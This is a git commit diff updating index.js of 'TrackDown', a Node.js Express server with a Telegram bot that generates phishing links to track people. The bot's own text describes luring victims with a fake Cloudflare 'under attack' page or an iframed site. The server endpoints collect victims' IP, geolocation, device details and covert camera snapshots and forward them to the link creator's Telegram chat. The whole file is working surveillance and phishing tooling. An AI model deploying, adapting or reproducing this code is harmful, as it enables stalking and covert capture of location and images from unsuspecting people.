8fbcfb11123bbb15ee55ab65d8d18e014f7299bd
PAIDAKULA SRIKANTH <136217960+srikanthpaidakula@users.noreply.github.com>
2025-08-31 21:02:04 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,251 +1,167 @@
 require('dotenv').config();
 const fs = require("fs");
 const express = require("express");
-var cors = require('cors');
-var bodyParser = require('body-parser');
+const cors = require('cors');
+const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling: true});
-var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
-var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+
+const TOKEN = process.env["bot"];
+const WEBHOOK_URL = process.env["WEBHOOK_URL"]; // Your public URL with /bot endpoint
+const bot = new TelegramBot(TOKEN);
+bot.setWebHook(`${WEBHOOK_URL}/bot`);
+
+const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
+const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
+
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-//Modify your URL here
-var hostURL="https://trackdown-ld0o.onrender.com/";
-//TOGGLE for Shorters
-var use1pt=false;
+// Modify your URL here
+const hostURL = "https://trackdown-ld0o.onrender.com/";
+// TOGGLE for Shorters
+const use1pt = false;
 
+// ==================== Express Routes ====================
 
+app.get("/w/:path/:uri", (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+    let d = new Date().toJSON().slice(0, 19).replace('T', ':');
 
-app.get("/w/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
-
-         
-                              
+    if (req.params.path) {
+        res.render("webview", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+    } else {
+        res.redirect("https://t.me/th30neand0nly0ne");
+    }
 });
 
-app.get("/c/:path/:uri",(req,res)=>{
-var ip;
-var d = new Date();
-d=d.toJSON().slice(0,19).replace('T',':');
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
+app.get("/c/:path/:uri", (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+    let d = new Date().toJSON().slice(0, 19).replace('T', ':');
 
-  
-
-if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
-} 
-else{
-res.redirect("https://t.me/th30neand0nly0ne");
-}
-
-         
-                              
+    if (req.params.path) {
+        res.render("cloudflare", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+    } else {
+        res.redirect("https://t.me/th30neand0nly0ne");
+    }
 });
-
-
-
-bot.on('message', async (msg) => {
-const chatId = msg.chat.id;
-
- 
-
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
- createLink(chatId,msg.text); 
-}
-  
-if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
-
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
-}
-else if(msg.text=="/create"){
-createNew(chatId);
-}
-else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
-`);
-}
-  
-  
-});
-
-bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
-bot.answerCallbackQuery(callbackQuery.id);
-if(callbackQuery.data=="crenew"){
-createNew(callbackQuery.message.chat.id);
-} 
-});
-bot.on('polling_error', (error) => {
-//console.log(error.code); 
-});
-
-
-
-
-
-
-async function createLink(cid,msg){
-
-var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
-
-if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
- 
-var url=cid.toString(36)+'/'+btoa(msg);
-var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
-};
-
-var cUrl=`${hostURL}/c/${url}`;
-var wUrl=`${hostURL}/w/${url}`;
-  
-bot.sendChatAction(cid,"typing");
-if(use1pt){
-var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
-var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
-
-var f="",g="";
-
-for(var c in x){
-f+=x[c]+"\n";
-}
-
-for(var c in y){
-g+=y[c]+"\n";
-}
-  
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
-}
-else{
-
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
-}
-}
-else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-createNew(cid);
-
-}  
-}
-
-
-function createNew(cid){
-var mk={
-reply_markup:JSON.stringify({"force_reply":true})
-};
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
-}
-
-
-
-
 
 app.get("/", (req, res) => {
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-res.json({"ip":ip});
-
-  
+    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+    res.json({ ip });
 });
 
+app.post("/location", (req, res) => {
+    const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
+    const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const acc = decodeURIComponent(req.body.acc) || null;
 
-app.post("/location",(req,res)=>{
-
-  
-var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
-var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
-var uid=decodeURIComponent(req.body.uid) || null;
-var acc=decodeURIComponent(req.body.acc) || null;
-if(lon != null && lat != null && uid != null && acc != null){
-
-bot.sendLocation(parseInt(uid,36),lat,lon);
-
-bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
-  
-res.send("Done");
-}
+    if (lat && lon && uid && acc) {
+        bot.sendLocation(parseInt(uid, 36), lat, lon);
+        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
+        res.send("Done");
+    }
 });
 
+app.post("/", (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    let data = decodeURIComponent(req.body.data) || null;
+    const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
 
-app.post("/",(req,res)=>{
+    if (uid && data) {
+        if (data.indexOf(ip) < 0) return res.send("ok");
 
-var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
-
-var ip;
-if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
-  
-if( uid != null && data != null){
-
- 
-if(data.indexOf(ip) < 0){
-return res.send("ok");
-}
-
-data=data.replaceAll("<br>","\n");
-
-bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});
-
-  
-res.send("Done");
-}
+        data = data.replaceAll("<br>", "\n");
+        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
+        res.send("Done");
+    }
 });
 
+app.post("/camsnap", (req, res) => {
+    const uid = decodeURIComponent(req.body.uid) || null;
+    const img = decodeURIComponent(req.body.img) || null;
 
-app.post("/camsnap",(req,res)=>{
-var uid=decodeURIComponent(req.body.uid)  || null;
-var img=decodeURIComponent(req.body.img) || null;
-  
-if( uid != null && img != null){
-  
-var buffer=Buffer.from(img,'base64');
-  
-var info={
-filename:"camsnap.png",
-contentType: 'image/png'
-};
-
-
-try {
-bot.sendPhoto(parseInt(uid,36),buffer,{},info);
-} catch (error) {
-console.log(error);
-}
-
-
-res.send("Done");
- 
-}
-
+    if (uid && img) {
+        const buffer = Buffer.from(img, 'base64');
+        try {
+            bot.sendPhoto(parseInt(uid, 36), buffer, { filename: "camsnap.png", contentType: 'image/png' });
+        } catch (error) {
+            console.log(error);
+        }
+        res.send("Done");
+    }
 });
 
+// ==================== Webhook for Telegram ====================
+app.post("/bot", (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
 
+// ==================== Bot Logic ====================
 
-app.listen(5000, () => {
-console.log("App Running on Port 5000!");
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+
+    if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
+        createLink(chatId, msg.text);
+    }
+
+    if (msg.text === "/start") {
+        const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] }) };
+        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !\nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location, device info, camera snaps.\n\nType /help for more info.`, m);
+    } else if (msg.text === "/create") {
+        createNew(chatId);
+    } else if (msg.text === "/help") {
+        bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin...`);
+    }
+});
+
+bot.on('callback_query', async (callbackQuery) => {
+    bot.answerCallbackQuery(callbackQuery.id);
+    if (callbackQuery.data === "crenew") {
+        createNew(callbackQuery.message.chat.id);
+    }
+});
+
+async function createLink(cid, msg) {
+    const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
+    if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
+        const url = cid.toString(36) + '/' + btoa(msg);
+        const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]] }) };
+        const cUrl = `${hostURL}/c/${url}`;
+        const wUrl = `${hostURL}/w/${url}`;
+
+        bot.sendChatAction(cid, "typing");
+        if (use1pt) {
+            const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
+            const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+
+            let f = "", g = "";
+            for (let c in x) f += x[c] + "\n";
+            for (let c in y) g += y[c] + "\n";
+
+            bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
+        } else {
+            bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+        }
+    } else {
+        bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
+        createNew(cid);
+    }
+}
+
+function createNew(cid) {
+    const mk = { reply_markup: JSON.stringify({ "force_reply": true }) };
+    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
+}
+
+// ==================== Start Server ====================
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+    console.log(`App Running on Port ${PORT}!`);
 });
